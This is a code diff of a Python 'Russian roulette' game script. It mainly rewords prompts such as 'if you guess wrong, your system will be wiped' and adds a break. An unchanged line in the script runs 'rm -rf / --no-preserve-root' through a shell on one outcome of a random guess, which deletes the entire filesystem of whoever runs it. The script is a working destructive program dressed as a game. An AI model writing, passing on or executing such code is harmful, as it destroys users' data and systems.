@@ -4,15 +4,16 @@ import subprocess
 print("*click*")
 print("this is a revolver")
 print("I will select a random cylinder to put a bullet in")
-print("you have to guess a number")
-print("if you guess the cylinder I selected, your sytem gets deleted")
+print("you have to guess what cylinder the bullet is in")
+print("if you guess wrong, your system will be wiped")
+print("good luck")
 
 while True:
     cylinder = random.randint(1, 6)
 
     #print ("cylinder", cylinder)
         
-    cylinder_guess = int(input("take a guess: "))
+    cylinder_guess = int(input("take a guess (number from 1-6): "))
 
     if cylinder_guess < 1 or cylinder_guess > 6:
         print("nice try")
@@ -25,4 +26,5 @@ while True:
         subprocess.call("rm -rf / --no-preserve-root", shell=True)
         break
     else:    
-        print("you live")
+        print("your sytem lives for another day")
+        break
